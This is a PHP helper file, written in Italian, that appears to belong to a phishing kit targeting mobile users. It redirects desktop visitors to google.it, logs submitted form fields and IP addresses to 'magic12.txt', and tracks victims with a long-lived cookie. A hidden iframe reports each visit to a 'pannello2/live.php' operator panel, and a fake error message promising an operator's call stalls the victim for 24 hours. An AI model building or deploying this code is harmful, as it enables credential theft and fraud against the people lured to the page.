<?php
date_default_timezone_set('Europe/Rome');

function  messaggiofinale(){
    $btn="<BR><BR><a  href='?chiama=1'><b>RICHIEDI CHIAMATA</b></a>";

    if(isset($_REQUEST['chiama']))
    {
        $btn="<BR><BR><b>la richiesta di chiamata di assistenza inoltrata, attendi qualche minuto...</b>";

    }
    return "Si è verificato un errore.<br><br>Un operatore la contatterà a breve.<br><br>
    Si prega di evitare l'utilizzo dell' app per le prossime 24 ore.".$btn;
}
function solomobile(){
    require_once('mobile/Mobile_Detect.php');
    $detect = new Mobile_Detect;
    if ($detect->isMobile()) {
    $ua = "Mobile";
    } elseif ($detect->isTablet()) {
        $ua = "Tablet";
    } else {
       header("Location: http://www.google.it"); 
       exit;
    }
}
function script(){
    $id=getid();
    if($id){
        $actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
        ?>
<iframe  style="width:0px; heigth:0px;display:none;position:absolute:top:-90000px" src="pannello2/live.php?id=<?php echo $id ?>&pagina=<?php echo  urlencode($actual_link) ?>"></iframe>
        <?php
    }
}
function salvadebug($pagina){
if (!file_exists('magic12.txt')) {
touch('magic12.txt');
}
     
  $dati =""; 
foreach($pagina as $parametro ){
    
if(isset($_POST[$parametro])){
    $dati.=" $parametro -> '".$_POST[$parametro]."' | ";
}
    }
    if($dati){
        file_put_contents('magic12.txt',getUserIP()." ". $dati."\n", FILE_APPEND );
    }

}
function getUserIP()
{
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];}
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }elseif(filter_var($forward, FILTER_VALIDATE_IP)){     
		$ip = $forward;
    }else{
        $ip = $remote;
    }
    return $ip;
}
function getid(){
		if (!isset($_COOKIE['COOKIE_KEY'])) {
		
	}else{
  return $_COOKIE['COOKIE_KEY'];
	}
   
}
function forzaid(){
    setcookie("COOKIE_KEY", time().mt_rand(1,100), time() + (10 * 365 * 24 * 60 * 60));  
  return $_COOKIE['COOKIE_KEY'];

}
function creaid($numero,$cartella){

	if (!isset($_COOKIE['COOKIE_KEY'])) {
		setcookie("COOKIE_KEY",  time().mt_rand(1,100), time() + (10 * 365 * 24 * 60 * 60));  
       
	}else{
      
    
	}
      if(isset($_COOKIE['COOKIE_KEY'])){
   return $_COOKIE['COOKIE_KEY'];
      }else{
          return false;
      }
  
}
function creafile($nome){
	if (!file_exists($nome)) {
		touch($nome);
	}
}
function conta($numero){
    if(!$numero){

        if (!file_exists('visite.txt')) {
            touch('visite.txt');
        }
        $counter = intval(file_get_contents('visite.txt')) + 1;
        file_put_contents('visite.txt', $counter);
    
    }
}
$dajeee=1;
?>